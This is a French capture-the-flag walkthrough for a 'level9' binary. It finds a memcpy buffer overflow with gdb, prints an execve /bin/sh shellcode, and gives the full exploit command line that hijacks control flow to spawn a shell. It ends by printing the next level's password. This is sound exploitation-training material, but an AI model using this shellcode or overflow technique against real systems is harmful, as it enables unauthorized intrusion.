on commence avec gdb level9, puis on va sur overflow generator, et on met la string
dans argv[1], l'addresse du segfault indiquée est fausse mais si on regarde les registres avec "i r"
on vois que la valeur qui nous intéresse est dans ECX : 0x41366441, le pointeur de destination est
quand a lui mis dans EAX par le memcpy
cela nous fait donc un offset de 108

la faille viens du memcpy qui ecrit dans un buffer de 100 en se basant sur un strlen, donc on peut
écrire ou on veut, dans EIP par exemple...

quelques trucs utiles:
    0x804a00c : l'addresse de notre parametre AAAA ( b *0x0804867c && x/s $eax)
    0x804a010 : 4 juste apres
    notre shellcode: '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

on commence par:
Starting program: /home/user/level9/level9 `python  -c "print('\x90' * 83 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x08\x04\xa0\x0c'[::-1])"`

Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()

on remarque que le binaire prends les 4 premiers chars de arv[1] en tant que pointeur, on va donc lui
dire de jump juste apres: a 0x804a010

du coup:
./level9 `python  -c "print('\x08\x04\xa0\x10'[::-1]  + '\x90' * 79 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x08\x04\xa0\x0c'[::-1])"`

$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
